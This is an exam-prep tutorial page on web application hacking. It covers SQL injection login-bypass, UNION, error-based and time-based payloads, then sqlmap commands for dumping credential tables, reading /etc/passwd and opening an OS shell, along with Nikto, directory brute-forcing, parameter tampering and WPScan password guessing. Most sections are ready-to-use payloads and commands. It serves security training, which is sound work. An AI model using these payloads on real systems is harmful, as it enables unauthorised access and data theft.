---
layout: default
title: Domain 3 - Web Server & Application Hacking
parent: Domains
nav_order: 3
description: "SQL injection, web directory enumeration, parameter tampering, and WordPress exploitation."
has_children: false
---

# Domain 3: Web Server & Application Hacking

## Overview

Web applications are common targets. SQL injection, directory traversal, and parameter tampering allow attackers to bypass authentication and steal data.

**Key Topics:**
- SQL injection with SQLMAP
- Web directory enumeration (Nikto, Robuster)
- DVWA vulnerable application
- Parameter tampering
- WordPress exploitation
- File upload vulnerabilities
- Authentication bypass

**Duration:** 15-25 minutes per task  
**Difficulty:** Medium  
**Tools:** SQLMAP, Nikto, Robuster, Burp Suite, WPScan, Curl

---

## 3.1 SQL Injection — Manual First, Then SQLMAP

### What It Does

SQL injection (SQLi) tricks an app into running your SQL instead of treating your input as data. The app builds a query by string-gluing your input straight into it. Break out of the string, and the database does what you say — bypass login, dump tables, read files.

Mental model: the developer wrote `... WHERE user='[YOUR INPUT]'`. You don't send a username — you send the rest of the query.

> **Exam tip:** CEH practical often gives you a login form or a `?id=` URL. Try the manual login bypass FIRST (60 seconds, no tools). If it works, you're done. Only reach for SQLMAP when you need to enumerate or dump.

---

### 3.1.1 Authentication Bypass (Login Form) — The Classic

The vulnerable backend query usually looks like:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass';
```

You inject into the username (or password) field so the `WHERE` clause is always true.

**Payloads to type into the username field:**

```sql
admin' --
admin'--
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
' OR 1=1#
') OR ('1'='1
" OR "1"="1
```

**Why `admin' -- ` works (breakdown):**

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='x';
```
- `admin'` = closes the username string
- `-- ` = comments out the REST of the query (the password check is gone)
- Result: logs in as `admin` without knowing the password

> Note: `--` in MySQL needs a trailing space (`-- `). `#` is a safe alternative comment in MySQL.

**Why `' OR '1'='1` works:**

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='';
```
- `'1'='1'` is always true → returns the first user in the table (often admin)

**Login as a specific user, no password:**
```sql
admin' --              ← username field, password field anything
```

---

### 3.1.2 Detecting SQLi on a URL Parameter

Given `http://target/page.php?id=1`:

```bash
# Break it — a SQL error or blank page = likely injectable
http://target/page.php?id=1'
http://target/page.php?id=1"

# Boolean test — true vs false should differ
http://target/page.php?id=1 AND 1=1      # page loads normal
http://target/page.php?id=1 AND 1=2      # page breaks / empty
```

If `1=1` and `1=2` give different pages → injectable (even with no visible error = blind).

---

### 3.1.3 UNION-Based SQLi (Pull Data Onto the Page)

```bash
# 1. Find the column count — increase until no error
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--      # errors at N+1 → table has N columns

# 2. Find which columns echo on the page
?id=-1 UNION SELECT 1,2,3--

# 3. Dump DB info into the visible columns
?id=-1 UNION SELECT 1,version(),database()--
?id=-1 UNION SELECT 1,user(),@@version--

# 4. List tables, then columns
?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

# 5. Dump creds
?id=-1 UNION SELECT 1,concat(username,':',password),3 FROM users--
```
`id=-1` forces the original row empty so your UNION row is what shows.

---

### 3.1.4 Error-Based SQLi (MySQL)

When the page leaks SQL errors, force the data into the error text:

```sql
?id=1 AND extractvalue(1,concat(0x7e,(SELECT database())))--
?id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)--
```
`0x7e` is `~`, a marker so you can spot your output in the error string.

---

### 3.1.5 Blind & Time-Based SQLi (No Output, No Errors)

When the page shows nothing useful, ask yes/no questions and read the answer from **page behavior** or **response delay**.

**Boolean-blind** — page changes on true vs false:
```sql
?id=1 AND SUBSTRING(database(),1,1)='a'--     # if page = normal, first char is 'a'
?id=1 AND (SELECT LENGTH(database()))=4--     # confirm db name length
```

**Time-based** — page DELAYS when the condition is true. Use when there's zero visible difference.

```sql
# MySQL
?id=1 AND SLEEP(5)--                                  # 5s delay = injectable
?id=1 AND IF(1=1,SLEEP(5),0)--                        # true → sleeps
?id=1 AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--   # leak char by char

# MySQL alt
?id=1 AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--

# PostgreSQL
?id=1; SELECT pg_sleep(5)--
?id=1 AND 1=(SELECT 1 FROM PG_SLEEP(5))--

# MSSQL
?id=1; WAITFOR DELAY '0:0:5'--

# Oracle
?id=1 AND 1=(dbms_pipe.receive_message('a',5))--
```

**How to read it:** response comes back in ~5s → condition TRUE. Instant → FALSE. Walk every character of every secret this way. Tedious by hand → this is exactly what SQLMAP automates.

---

### 3.1.6 SQLMAP (Automation)

```bash
# GET parameter
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs

# POST data (login form)
sqlmap -u "http://192.168.1.5/login.php" --data "user=admin&pass=test" --dbs

# From a captured Burp request (best for complex/auth'd requests)
sqlmap -r request.txt --dbs

# With a session cookie
sqlmap -u "http://192.168.1.5/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs

# Enumerate tables, then dump
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump

# Just grab the current DB + creds fast
sqlmap -u "http://192.168.1.5/page.php?id=1" --current-db --dump --batch

# Force a technique / DBMS when auto-detect is slow
sqlmap -u "http://192.168.1.5/page.php?id=1" --technique=T --dbms=mysql   # T = time-based
sqlmap -u "http://192.168.1.5/page.php?id=1" --level=5 --risk=3           # dig harder

# Read files from server
sqlmap -u "http://192.168.1.5/page.php?id=1" --file-read="/etc/passwd"

# OS shell
sqlmap -u "http://192.168.1.5/page.php?id=1" --os-shell
```

**Useful flags:** `--batch` (no prompts), `-p id` (target one param), `--threads 5` (faster blind), `--tamper=space2comment` (basic WAF bypass), `--dump-all` (everything).

---

## 3.2 Web Directory Enumeration

### What It Does

Web servers often have hidden pages and folders (admin panels, backups, config files) that aren't linked anywhere. Directory enumeration finds them by trying thousands of common names and seeing which ones exist.

Like rattling every doorknob in a building to find the one room they forgot to lock.

### Nikto

Nikto scans a web server for known problems — outdated software, dangerous default files, and misconfigurations — in one pass.

```bash
nikto -h http://192.168.1.5            # scan the web server
nikto -h 192.168.1.5 -p 8080           # scan a non-standard port
nikto -h http://192.168.1.5 -o report.txt   # save results to a file
```

### Robuster

Robuster brute-forces directory and file names using a wordlist (a list of common names to try) and reports the ones that exist on the server.

```bash
robuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/common.txt   # use a built-in wordlist
robuster dir -u http://192.168.1.5 -w wordlist.txt                           # use your own wordlist
```

---

## 3.3 Parameter Tampering

### What It Does

Parameter tampering means changing values the app sends in a request — like a price or a user ID — before the server receives them. If the server trusts whatever the browser sends, you can rewrite it in your favor.

Like editing the price tag at checkout and hoping the cashier doesn't look.

Use Burp Suite (a proxy that sits between your browser and the server so you can pause and edit requests) to:
1. Enable proxy capture
2. Intercept request
3. Modify parameters
4. Forward to observe effect

Example:
```
Original: http://site.com/purchase.php?item=shirt&price=10
Modified: http://site.com/purchase.php?item=shirt&price=1
```

---

## 3.4 WordPress Scanning

### What It Does

WPScan checks a WordPress site for weaknesses — it lists valid usernames, and finds installed plugins and themes (often the buggiest, most outdated parts) so you know what to attack.

> **Exam tip:** Vulnerable plugins are the most common way into a WordPress site. Enumerate them first.

```bash
wpscan --url http://target.com --enumerate u              # find valid usernames
wpscan --url http://target.com --enumerate p              # find installed plugins
wpscan --url http://target.com --enumerate t              # find installed themes
wpscan --url http://target.com --enumerate all            # all of the above
wpscan --url http://target.com -U admin -P rockyou.txt    # guess admin's password from a wordlist
```

---

## See Also

- **[Challenges](../challenges/all-challenges.html)**
- **[Domain 1: Network Scanning](../domain-1-network-scanning/)**
- **[Domain 4: Cryptography](../domain-4-cryptography/)**

---

**Next Step:** Practice [challenges](../challenges/all-challenges.html)
